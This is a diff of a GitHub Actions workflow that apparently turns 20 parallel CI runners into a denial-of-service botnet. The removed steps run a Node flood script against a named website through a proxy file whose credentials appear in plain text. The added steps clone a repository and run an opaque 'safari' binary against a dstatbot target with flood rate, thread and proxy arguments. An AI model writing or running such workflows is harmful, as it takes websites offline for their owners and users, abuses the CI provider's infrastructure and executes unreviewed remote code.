@@ -13,33 +13,16 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19,20]
     
     steps:
     - name: Checkout code
       uses: actions/checkout@v4
 
-    - name: Setup Node.js
-      uses: actions/setup-node@v4
-      with:
-        node-version: '18'
-
-    - name: Install dependencies
+    - name: Convert line endings and run safari (Instance ${{ matrix.instance }})
       run: |
-        npm init -y
-        npm install hpack chalk@4
-
-    - name: Create proxy file
-      run: |
-        cat > 11 << 'EOF'
-        proxy.global.ip2up.com:12348:A6pqQq-res-any:lKWbjJCH
-        proxy.global.ip2up.com:12348:A6pqQq-res-any:lKWbjJCH
-        proxy.global.ip2up.com:12348:A6pqQq-res-any:lKWbjJCH
-
-
-        
-        EOF
-
-    - name: Run a.js (Instance ${{ matrix.instance }})
-      run: |
-        node a.js GET https://saberpedia.no/Overlord 700 4 1 proxy.txt --bfm --debug --auth
+        git clone https://github.com/Kiwiwjkwi/cuddly-octo-bassoon.git
+        cd cuddly-octo-bassoon
+        chmod +x safari
+        ./safari  https://c1.dstatbot.win/hwFqPicB   400 10000 8000 proxies.txt   --raw --cdn
+    
